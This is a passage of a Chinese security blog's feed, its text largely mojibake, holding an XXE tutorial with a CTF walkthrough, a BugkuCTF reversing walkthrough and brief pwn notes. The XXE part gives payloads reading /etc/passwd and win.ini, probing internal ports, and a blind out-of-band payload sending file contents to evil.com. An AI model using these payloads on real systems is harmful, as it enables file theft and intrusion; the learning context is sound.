ä¸ªé¢„å®šä¹‰çš„å®ä½“å¼•ç”¨ï¼š</p><table><thead><tr><th>&amp;lt</th><th>&lt;</th><th>å°äºå·</th></tr></thead><tbody><tr><td>&amp;gt</td><td>&gt;</td><td>å¤§äºå·</td></tr><tr><td>&amp;amp</td><td>&amp;</td><td>å’Œå·</td></tr><tr><td>&amp;apos</td><td>â€™</td><td>å•å¼•å·</td></tr><tr><td>&amp;quot</td><td>&quot;</td><td>å¼•å·</td></tr></tbody></table><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—</p><p>DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</p><pre><code class="language-xml">&lt;!--XMLå£°æ˜--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;&lt;!DOCTYPE note [  ã€€ã€€&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;]]]&gt;&lt;!--æ–‡æ¡£å…ƒç´ --&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;</code></pre><p>ä¸Šè¿°XMLä»£ç åŸºæœ¬åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>ç¬¬ä¸€éƒ¨åˆ†æ˜¯XMLçš„å£°æ˜ï¼›</li><li>ç¬¬äºŒéƒ¨åˆ†æ˜¯XMLçš„DTDæ–‡æ¡£ç±»å‹å®šä¹‰</li><li>ç¬¬ä¸‰éƒ¨åˆ†æ˜¯XMLè¯­å¥</li></ul><p>è€Œå¤–éƒ¨å®ä½“æ”»å‡»ä¸»è¦åˆ©ç”¨DTDçš„å¤–éƒ¨å®ä½“æ¥è¿›è¡Œæ³¨å…¥çš„ã€‚</p><p>DTDæœ‰ä¸¤ç§æ„å»ºæ–¹å¼ï¼Œåˆ†åˆ«ä¸º<strong>å†…éƒ¨DTDå£°æ˜</strong>å’Œ<strong>å¤–éƒ¨DTDå£°æ˜</strong></p><blockquote><p>â€‹tips: DTD = Document Type Definition ç®€ç§°</p></blockquote><p><strong>å†…éƒ¨DTDå£°æ˜ï¼š</strong></p><pre><code class="language-xml">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></pre><p>å®ä¾‹ï¼šå¦‚ä¸Šè¿°ä»£ç </p><p><strong>å¤–éƒ¨DTDå£°æ˜ï¼š</strong></p><pre><code class="language-xml">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</code></pre><p>å®ä¾‹ï¼š</p><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y&lt;/to&gt;&lt;from&gt;K&lt;/from&gt;&lt;head&gt;J&lt;/head&gt;&lt;body&gt;ESHLkangi&lt;/body&gt;&lt;/note&gt;</code></pre><h1 id="0x02-XMLç®€å•ç”¨æ³•">0x02 XMLç®€å•ç”¨æ³•</h1><pre><code class="language-XML">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></pre><p>å¤–éƒ¨å®ä½“:</p><pre><code class="language-XML">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</code></pre><p>å‚æ•°å®ä½“:</p><pre><code class="language-XML">&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></pre><p>æˆ–è€…</p><pre><code class="language-XML">&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</code></pre><p>å®åˆ—æ¼”ç¤º:  é™¤å‚æ•°å®ä½“å¤–å®ä½“+å†…éƒ¨å®ä½“</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;&lt;foo&gt;    &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt;</code></pre><p>å®åˆ—æ¼”ç¤º: å‚æ•°å®ä½“+å¤–éƒ¨å®ä½“</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;%name;]&gt;</code></pre><p>æ³¨æ„ï¼š%nameï¼ˆå‚æ•°å®ä½“ï¼‰æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;nameï¼ˆå…¶ä½™å®ä½“ï¼‰æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„ã€‚</p><p>ç”±äºxxeæ¼æ´ä¸»è¦æ˜¯åˆ©ç”¨äº†DTDå¼•ç”¨å¤–éƒ¨å®ä½“å¯¼è‡´çš„æ¼æ´ï¼Œé‚£ä¹ˆé‡ç‚¹çœ‹ä¸‹èƒ½å¼•ç”¨å“ªäº›ç±»å‹çš„å¤–éƒ¨å®ä½“ã€‚</p><p>å¤–éƒ¨å®ä½“ å¤–éƒ¨å®ä½“å³åœ¨DTDä¸­ä½¿ç”¨</p><pre><code class="language-xml">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</code></pre><p>å®ä¾‹æ¼”ç¤ºï¼š</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a[ //å®šä¹‰ä¸€ä¸ªå¤–éƒ¨åç§°&lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt; //SYSTEM &quot;file:///xxxx&quot; ç”¨äºè¯»å–æ–‡ä»¶&lt;foo&gt;&lt;value&gt;&amp;content;&lt;/value&gt;&lt;/foo&gt;</code></pre><p>å¾—å¸¦Content-Type: application/xmlå¤´ï¼Œ</p><p>å¦‚æœè¯·æ±‚å¤´ç±»ä¼¼äºï¼šContent-Type: application/jsonï¼Œ</p><p>é‚£ä¹ˆå¯ä»¥æ”¹ä¸ºContent-Type: application/xmlè¯•è¯•æœ‰æ²¡æœ‰xmlæ¼æ´</p><h1 id="0x03-XXEæ¼æ´å®æˆ˜">0x03 XXEæ¼æ´å®æˆ˜</h1><p>é¢˜ç›®åœ°å€ï¼š<a href="http://web.jarvisoj.com:9882" target="_blank" rel="noopener">web.jarvisoj.com:9882</a></p><p><img src="1.PNG" alt="1"></p><p>æˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹</p><p><img src="2.PNG" alt="2"></p><p>ç°åœ¨æˆ‘ä»¬å°è¯•æŠŠ <strong>Content-Type: application/json</strong> æ”¹æˆ <strong>application/xml</strong></p><p>å‘é€ä»¥ä¸‹å†…å®¹æ¢æµ‹æ˜¯å¦å­˜åœ¨XXE</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE TEST [ &lt;!ENTITY xxe &quot;XXE TEST&quot;&gt; //XXE Testæ˜¯è¾“å‡ºçš„å†…å®¹ xxeå¯ä»¥ä¸ºç†è§£ä¸ºä¸€ä¸ªå˜é‡ ]&gt;&lt;foo&gt; //ä¹±å–ä¸ªåå°±å¥½  &amp;xxe; //ç†è§£ä¸ºå¼•ç”¨å˜é‡åœ°å€è¾“å‡º&lt;/foo&gt; </code></pre><p><img src="3.PNG" alt="3"></p><p>è¯»å–æ–‡ä»¶æµ‹è¯•</p><p><img src="4.PNG" alt="4"></p><p>è¯»å–flagæµ‹è¯•</p><p><img src="5.PNG" alt="5"></p><h2 id="0x03-1-ä¸‹é¢åˆ—å‡ºå…¶ä»–çš„ç”¨æ³•">0x03.1 ä¸‹é¢åˆ—å‡ºå…¶ä»–çš„ç”¨æ³•</h2><p>XMLæ–‡æ¡£æ˜¯ç”¨PHPè¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ä½¿ç”¨php:*//filteråè®®æ¥è¿›è¡Œè¯»å–ã€‚</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM &quot;php://filter/resource=c:/windows/win.ini&quot;&gt; ]&gt; &lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt; </code></pre><p>ç«¯å£æ‰«æ åŠ è½½å¤–éƒ¨DTDæ—¶æœ‰ä¸¤ç§åŠ è½½æ–¹å¼ï¼Œä¸€ç§ä¸ºç§æœ‰privateï¼Œç¬¬äºŒç§ä¸ºå…¬å…±publicã€‚ ç§æœ‰ç±»å‹DTDåŠ è½½ï¼š</p><pre><code class="language-XML">&lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt;</code></pre><p>å…¬å…±ç±»å‹DTDåŠ è½½ï¼š</p><pre><code class="language-XML">&lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt;</code></pre><p>åœ¨å…¬å…±ç±»å‹DTDåŠ è½½çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šä½¿ç”¨DTD_nameæ¥æ£€ç´¢ï¼Œå¦‚æœæ— æ³•æ‰¾åˆ°ï¼Œåˆ™é€šè¿‡DTD_locationæ¥å¯»æ‰¾æ­¤å…¬å…±DTDã€‚åˆ©ç”¨DTD_locationï¼Œåœ¨ä¸€å®šçš„ç¯å¢ƒä¸‹å¯ä»¥ç”¨æ¥åšå†…ç½‘æ¢æµ‹ã€‚</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [    &lt;!ENTITY portscan SYSTEM &quot;http://localhost:3389&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt;</code></pre><p>blind xxeæ¼æ´: å¯¹äºä¼ ç»Ÿçš„XXEæ¥è¯´ï¼Œè¦æ±‚æ”»å‡»è€…åªæœ‰åœ¨æœåŠ¡å™¨æœ‰å›æ˜¾æˆ–è€…æŠ¥é”™çš„åŸºç¡€ä¸Šæ‰èƒ½ä½¿ç”¨XXEæ¼æ´æ¥è¯»å–æœåŠ¡å™¨ç«¯æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å›æ˜¾åˆ™å¯ä»¥ä½¿ç”¨Blind XXEæ¼æ´æ¥æ„å»ºä¸€æ¡å¸¦å¤–ä¿¡é“æå–æ•°æ®ã€‚</p><p>åˆ©ç”¨DTDè¿›è¡Œæ•°æ®å›æ˜¾ æœ‰æ—¶è¯»å–æ–‡ä»¶æ—¶æ²¡æœ‰å›æ˜¾ï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨DTDå‚æ•°å®ä½“çš„ç‰¹æ€§å°†æ–‡ä»¶å†…å®¹æ‹¼æ¥åˆ°urlä¸­ï¼Œè¾¾åˆ°è¯»å–æ–‡ä»¶çš„æ•ˆæœã€‚</p><pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root[     &lt;!ENTITY % file SYSTEM &quot;php://fileter/convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;      &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.100:8000/evil.dtd&quot;&gt;     %dtd;      %send;]&gt; &lt;root&gt;&lt;/root&gt;evil.dtd &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;&quot;&gt;%payload;</code></pre><p>åœ¨evil.dtdä¸­å°†%fileå®ä½“çš„å†…å®¹æ‹¼æ¥åˆ°urlåï¼Œç„¶ååˆ©ç”¨burpç­‰å·¥å…·ï¼ŒæŸ¥çœ‹urlè¯·æ±‚å°±èƒ½è·å¾—æˆ‘ä»¬éœ€è¦çš„å†…å®¹</p><h1 id="0x04-å‚è€ƒé“¾æ¥">0x04 å‚è€ƒé“¾æ¥</h1><blockquote><p>æˆ‘ä¸ªäººè®¤ä¸ºè®²çš„æœ€å¥½çš„é“¾æ¥ï¼š</p><p><a href="http://xz.aliyun.com/t/6887" target="_blank" rel="noopener">http://xz.aliyun.com/t/6887</a></p><hr><p><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p><p><a href="https://www.cnblogs.com/vincebye/p/7199290.html" target="_blank" rel="noopener">https://www.cnblogs.com/vincebye/p/7199290.html</a></p><p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p><p><a href="https://www.cnblogs.com/ESHLkangi/p/9245404.html" target="_blank" rel="noopener">https://www.cnblogs.com/ESHLkangi/p/9245404.html</a></p></blockquote><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTFé€†å‘</title>
      <link href="/2019/11/06/BugkuCTF%E9%80%86%E5%90%91/"/>
      <url>/2019/11/06/BugkuCTF%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å¼€è¨€">0x00 å¼€è¨€</h1><p>æœ€è¿‘äº†è§£äº†ç‚¹é€†å‘ï¼Œpwnï¼Œæ±‡ç¼–ï¼ŒCï¼ŒC#ç­‰çŸ¥è¯†ï¼Œå¼€å§‹è¯•ç€åˆ·é¢˜å®æˆ˜ä¸€ä¸‹ã€‚</p><a id="more"></a><h2 id="0x00-1-ç¯å¢ƒ-å·¥å…·">0x00.1 ç¯å¢ƒ&amp;å·¥å…·</h2><p>å·¥å…·ï¼š IDA &amp; OD</p><p>ç¯å¢ƒï¼šWindows7</p><h2 id="0x00-2-éœ€è¦æ³¨æ„çš„äº‹é¡¹">0x00.2 éœ€è¦æ³¨æ„çš„äº‹é¡¹</h2><blockquote><p><strong>tips: åœ¨windowsä¸‹é€†å‘éœ€è¦æ³¨æ„ï¼Œä»windowsXPä»¥ä¸Šéƒ½æœ‰å¼€å¯aslrä¿æŠ¤ï¼Œ</strong></p><p>â€‹<strong>ASLRï¼ˆAddress space layout randomizationï¼‰æ˜¯ä¸€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å¯¹å †ã€æ ˆã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–ï¼Œé€šè¿‡å¢åŠ æ”»å‡»è€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œé˜²æ­¢æ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®ï¼Œè¾¾åˆ°é˜»æ­¢æº¢å‡ºæ”»å‡»çš„ç›®çš„ã€‚</strong></p></blockquote><h1 id="0x01-å…¥é—¨é€†å‘">0x01 å…¥é—¨é€†å‘</h1><p>ä½¿ç”¨idaæ‰“å¼€å‘ç°æ²¡æœ‰ä»»ä½•å€¼å¾—ï¼ŒæŸ¥çœ‹çš„ã€‚ç›´æ¥ æŒ‰F5æŸ¥çœ‹ä¼ªä»£ç  å†æŒ‰Rè½¬ç          å°±å®Œäº‹äº†.</p><p><img src="1.PNG" alt="1"></p><h1 id="0x02-Easy-vb">0x02 Easy_vb</h1><p>idaæ‰“å¼€ ç›´æ¥å¾€ä¸‹çœ‹ã€‚çœ‹åˆ°flag</p><p><img src="1-1573024106714.PNG" alt="1"></p><h1 id="0x03-Easy-re">0x03 Easy_re</h1><p>è¿™æ¬¡ä½¿ç”¨ odå·¥å…· ã€‚ç›´æ¥ä¸Šåªèƒ½æœç´¢çœ‹çœ‹ã€‚</p><p><img src="1-1573024191980.PNG" alt="1"></p><h1 id="0x04-æ¸¸æˆè¿‡å…³">0x04 æ¸¸æˆè¿‡å…³</h1><p>è¿™ä¸€é¢˜æ¯”è¾ƒéš¾ã€‚</p><blockquote><p>éœ€è¦ç”¨åˆ°çš„å·¥å…·:</p><p>ida &amp; od</p></blockquote><h2 id="0x04-1-ç¬¬ä¸€æ­¥-IDA">0x04.1 ç¬¬ä¸€æ­¥ IDA</h2><p><strong>æˆ‘ä»¬å…ˆç”¨ ida å’Œ od æ‰“å¼€ ç¨‹åº</strong></p><p><img src="1-1573024519658.PNG" alt="1"></p><p><img src="2.PNG" alt="2"></p><p><strong>æˆ‘ä»¬å…ˆçœ‹idaè¿™è¾¹ï¼Œå…ˆçœ‹shift+f12çœ‹çœ‹å­—ç¬¦ä¸²</strong></p><p>å‘ç°å­—ç¬¦ä¸²çª—å£æœ‰ä¸ª <strong>done!!!the flag is</strong>  è¿™é‡Œæ˜¯æœ€åå¾—å‡ºflagçš„åœ°æ–¹ï¼Œæˆ‘ä»¬å…ˆä¸çœ‹ä»–ï¼Œå¾€ä¸‹ç¿»</p><p><img src="3.PNG" alt="3"></p><p><img src="4.PNG" alt="4"></p><p>è¿™æ¬¡æˆ‘ä»¬çœ‹åˆ° <strong>Play a game\n</strong> è¿™é‡Œæ˜¯ç¨‹åºçš„ å¼€å¤´è¨€çš„åœ°æ–¹ã€‚æˆ‘ä»¬åŒå‡»è·³è¿‡å»çœ‹çœ‹ã€‚</p><p><img src="5.PNG" alt="5"></p><p>è¿™é‡Œæœ‰è°ƒç”¨<strong>aPlayAGameTheNI</strong>å‡½æ•°ã€‚æˆ‘ä»¬æŒ‰<strong>x</strong>è·³åˆ°ï¼Œè°ƒç”¨ä»–çš„åœ°æ–¹ã€‚</p><p>ä»–è·³åˆ°äº†æœ€ä¸Šé¢çš„çª—å£ã€‚æˆ‘ä»¬å¾€ä¸‹ç¿»</p><p><img src="6.PNG" alt="6"></p><p>çœ‹åˆ° <strong>input n,n è¿™é‡Œ æ˜¯è®©ç”¨æˆ·è¾“å…¥(1-8)çš„åœ°æ–¹</strong>ã€‚æˆ‘ä»¬æŒ‰<strong>F5</strong>çœ‹çœ‹ä¼ªä»£ç </p><p><img src="7.PNG" alt="7"></p><p>åˆ†æä¸€ä¸‹ä¼ªä»£ç ã€‚</p><p><img src="8.PNG" alt="8"></p><p>æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œæ˜¯ç»™ç”¨æˆ·å¾ªç¯è¾“å…¥çš„åœ°æ–¹ æœ‰ä¸ªæ–­ç‚¹sub_459418();ã€‚å°±æ˜¯æˆ‘ä»¬è¦è·³è½¬çš„åœ°æ–¹.</p><p>æˆ‘ä»¬ç°åœ¨å›åˆ°ä¹‹å‰çœ‹åˆ° <strong>done!!! the flag is</strong> åœ°æ–¹ è·³è½¬è¿‡å»çœ‹ä¸€çœ‹ã€‚</p><p><img src="9.PNG" alt="9"></p><p>çœ‹åˆ°æœ‰ä¸€ä¸ªå‡½æ•°ä¸º <strong>aDoneTheFlagIs</strong>,</p><p>æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªé€‰é¡¹ï¼Œèƒ½ç›´æ¥æŸ¥çœ‹åˆ°è¿™ä¸ªçš„ <strong>åŸºå€</strong></p><p><img src="10.PNG" alt="10"></p><p>æˆ‘ä»¬å¾€ä¸Šç¿»ï¼Œæ‰¾åˆ°è¿™ä¸ªçš„Topä½ç½®</p><p><img src="11.PNG" alt="11"></p><p>è¿™é‡Œã€‚<strong>0045E940</strong>æˆ‘ä»¬è®°ä¸‹æ¥è¿™ä¸ª<strong>åŸºå€</strong></p><p>å†æŠŠ</p><p><img src="12.PNG" alt="12"></p><p>sub_459418();è¿™é‡Œçš„åŸºå€è®°ä¸‹æ¥ã€‚</p><h2 id="0x04-2-ç¬¬äºŒæ­¥-OD">0x04.2 ç¬¬äºŒæ­¥ OD</h2><p>ç°åœ¨æˆ‘ä»¬å›åˆ° od</p><p><img src="13.PNG" alt="13"></p><p>å…ˆè¿™ä¸ªç¨‹åºè¿è¡Œèµ·æ¥ã€‚ç‚¹æ’­æ”¾é”®(å·¦ä¸Šè§’)</p><p>ç„¶åæˆ‘ä»¬ç‚¹<strong>Ctrl+G</strong> æ¥è·³è½¬åœ°å€åˆ°<strong>0045E940</strong>åœ°æ–¹ã€‚</p><p><img src="14.PNG" alt="14"></p><p>æŒ‰F2è®¾ç½®æ–­ç‚¹ã€‚ç„¶ååˆ°ç¨‹åºé‡Œéšä¾¿è¾“å…¥ä¸ªæ•°å­—(1-8),å‘ç°è¯¥ç¨‹åºè¿è¡Œåˆ°äº†</p><p><img src="15.PNG" alt="15"></p><p><strong>0045f515åœ°å€</strong>è¿™é‡Œåœä½äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç”¨<strong>0045e940</strong>è¿™ä¸ªåœ°å€</p><p>åŒå‡»0045f515åœ°å€ï¼Œå†™ä¸Šjmp 0045e940(jmpä¸ºæ±‡ç¼–ç ï¼Œæ„æ€è·³è½¬)</p><p><img src="16.PNG" alt="16"></p><p><img src="17-1573025913557.PNG" alt="17"></p><p>æ›´æ–°ç¨‹åºè¿è¡Œã€‚ç‚¹åˆ°è¯¥ç¨‹åºçš„å¾ªç¯ä½ç½®ï¼Œä¸ºæ­¢ã€‚(0045EB51)</p><p><img src="18.PNG" alt="18"></p><p>ç™½æ¡†çš„ä½ç½®ä¾¿æ˜¯ã€€ï½—ï½ˆï½‰ï½Œï½…å¾ªç¯çš„åœ°æ–¹<br>æˆ‘ä»¬åœ¨0045EBC1åœ°å€è®¾ç½®æ–­ç‚¹ã€€ä½¿è¿™ä¸ªç¨‹åºç›´æ¥è·³è¿‡ï½—ï½ˆï½‰ï½Œï½…å¾ªç¯<br>è®¾ç½®æ–­ç‚¹åã€€ç‚¹ç»§ç»­è¿è¡Œç¨‹åº</p><p><img src="19.PNG" alt="19"></p><p><img src="20.PNG" alt="20"></p><p>æ‹¿åˆ°flag!</p><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Reverse-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Reverse-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pwnã€‘å­¦ä¹ ç¬”è®°ç¬¬é›¶æœŸ:å¼€ç«¯</title>
      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-èµ·å› ">0x00 èµ·å› </h1><p>æœ‰ä¸€æ¬¡å·²ç»ä¸Šäº†æ·±èŒé™¢çš„å­¦é•¿å‘Šè¯‰æˆ‘ï¼Œæ·±èŒé™¢é‚£è¾¹éå¸¸ç¼ºpwné€‰æ‰‹ã€‚æˆ‘ä¸€ç›´æŒºå¤´ç–¼pwné¢˜çš„ï¼Œè€—çœ¼åŠ›ã€‚å…¥é—¨éš¾ã€‚ è€Œä¸”è¿™æ–¹é¢çš„èµ„æ–™ä¹Ÿç›¸å¯¹è¾ƒå°‘ï¼Œæ‰€ä»¥å­¦ä¹ pwnçš„äººä¹Ÿæ˜¯ç›¸å¯¹è¾ƒå°‘çš„ã€‚ ä¸è¿‡ä¸ºäº†å¤šç´¯è®¡ä¸€äº›çŸ¥è¯†ï¼Œç¡¬ç€å¤´çš®å°è¯•çš„å¾€ä¸Šé¡¶ã€‚å†²å†²å†²ï¼ï¼ï¼</p><a id="more"></a><h1 id="0x01-éœ€è¦å…·å¤‡çš„çŸ¥è¯†">0x01 éœ€è¦å…·å¤‡çš„çŸ¥è¯†</h1><p>1.æ‰å®çš„CåŸºç¡€<br>2.åŸºæœ¬DSï¼šé“¾è¡¨ã€é˜Ÿåˆ—ã€æ ˆ<br>3.åŸºæœ¬linuxé…ç½®ä¸å‘½ä»¤<br>4.ä¼šæ±‡ç¼–æ›´å¥½ï¼Œä¸ä¼šçš„è¯ç°å­¦å‡ ä¸ªå¸¸ç”¨çš„ä¹Ÿå¯ä»¥æ•‘æ€¥ã€‚</p><h1 id="0x02-ç¯å¢ƒæ­å»º">0x02 ç¯å¢ƒæ­å»º</h1><p>ä½¿ç”¨çš„ç³»ç»Ÿ: ubuntu19</p><p>å·¥å…·: python - pwntools</p><p>â€‹  pwndbg</p><p>â€‹  ida</p><p>â€‹  gcc-multilib</p><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Pwn-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Pwn-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pwnã€‘å­¦ä¹ ç¬”è®°ç¬¬ä¸€æœŸ:æ ˆçŸ¥è¯†</title>
      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-éœ€è¦å…·å¤‡çš„çŸ¥è¯†">0x00 éœ€è¦å…·å¤‡çš„çŸ¥è¯†</h1><a id="more"></a><h3 id="ç¼–è¯‘ç¨‹åºçš„å†…å­˜åˆ†é…">ç¼–è¯‘ç¨‹åºçš„å†…å­˜åˆ†é…</h3><h4 id="æ ˆåŒº-stack">æ ˆåŒº (stack)</h4><p>å‡½æ•°è¿è¡Œæ—¶åˆ†é…ï¼Œå‡½æ•°ç»“æŸæ—¶é‡Šæ”¾ã€‚ç”±ç¼–è¯‘å™¨è‡ªåŠ¨åˆ†é…é‡Šæ”¾ ï¼Œå­˜æ”¾ä¸ºè¿è¡Œå‡½æ•°è€Œåˆ†é…çš„å±€éƒ¨å˜é‡ã€å‡½æ•°å‚æ•°ã€è¿”å›æ•°æ®ã€è¿”å›åœ°å€ç­‰ã€‚å…¶æ“ä½œæ–¹å¼ç±»ä¼¼äºæ•°æ®ç»“æ„ä¸­çš„æ ˆã€‚</p><h4 id="å †åŒº-heap">å †åŒº (heap)</h4><p>ä¸€èˆ¬ç”±ç¨‹åºå‘˜åˆ†é…é‡Šæ”¾ï¼Œ è‹¥ç¨‹åºå‘˜ä¸é‡Šæ”¾ï¼Œç¨‹åºç»“æŸæ—¶å¯èƒ½ç”±OSï¼ˆæ“ä½œç³»ç»Ÿï¼‰å›æ”¶ã€‚åˆ†é…æ–¹å¼ç±»ä¼¼äºé“¾è¡¨ã€‚</p><h4 id="å…¨å±€åŒº-é™æ€åŒºstatic">å…¨å±€åŒº(é™æ€åŒºstatic)</h4><p>å­˜æ”¾å…¨å±€å˜é‡ã€é™æ€æ•°æ®ã€å¸¸é‡ã€‚ç¨‹åºç»“æŸåç”±ç³»ç»Ÿé‡Šæ”¾ã€‚å…¨å±€åŒºåˆ†ä¸ºå·²åˆå§‹åŒ–å…¨å±€åŒºï¼ˆdataï¼‰å’Œæœªåˆå§‹åŒ–å…¨å±€åŒºï¼ˆbssï¼‰ã€‚</p><h4 id="å¸¸é‡åŒº-æ–‡å­—å¸¸é‡åŒº">å¸¸é‡åŒº(æ–‡å­—å¸¸é‡åŒº)</h4><p>å­˜æ”¾å¸¸é‡å­—ç¬¦ä¸²ï¼Œç¨‹åºç»“æŸåæœ‰ç³»ç»Ÿé‡Šæ”¾ã€‚</p><h4 id="ä»£ç åŒº">ä»£ç åŒº</h4><p>å­˜æ”¾å‡½æ•°ä½“ï¼ˆç±»æˆå‘˜å‡½æ•°å’Œå…¨å±€åŒºï¼‰çš„äºŒè¿›åˆ¶ä»£ç ã€‚</p><h1 id="0x01-å †æ ˆ-stack-çŸ¥è¯†">0x01 å †æ ˆ(stack)çŸ¥è¯†</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="å †æ ˆ"></p><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF-Pwn-Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Pwn-Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy2018_backdoor_exp</title>
